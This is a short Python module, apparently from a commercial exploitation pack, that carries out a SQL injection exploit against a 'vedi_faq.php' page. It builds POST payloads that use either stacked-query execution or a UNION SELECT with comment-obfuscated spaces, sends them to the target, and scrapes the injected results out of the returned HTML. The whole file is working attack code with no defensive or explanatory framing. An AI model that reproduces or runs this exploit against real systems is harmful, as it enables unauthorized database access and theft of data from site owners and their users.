#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

import os, sys

libpath = os.path.join(os.path.dirname(__file__), '../lib')
if libpath not in sys.path: sys.path.append(libpath)

###
# STD modules
###
import logging, urllib, urllib2, optparse, re

###
# SQLjack
###
import libsqljack

class exploit(libsqljack.exploit):
    
    EXPLOIT_TYPE = "mysql"

    def place_payload(self, payload):
        POSTDATA = {}
        if payload.has_key("mysql_exec"):
            POSTDATA['id'] = ";%s" % payload["mysql_exec"]
        elif payload.has_key("mysql_inject"):
            POSTDATA['id'] = '-1/**/union/**/all/**/select/**/1,%s,3,4/**/--/**/C' % payload["mysql_inject"]
        else:
            self.log.error("Failed to place payload.")
            return False
        vuln = "%s/vedi_faq.php" % (self.url)
        self.result = libsqljack.send_web_request(vuln , POSTDATA)
        return True

    def parse_result(self, result):
        matches = re.findall("<a href=\"vedi_faq\.php\?id=1\">(.*)</a>", result, re.DOTALL)
        if matches:
            result = matches[0]
        else:
            result = ''
        return super(exploit, self).parse_result(result)

if __name__ == '__main__': exploit().run_cli()
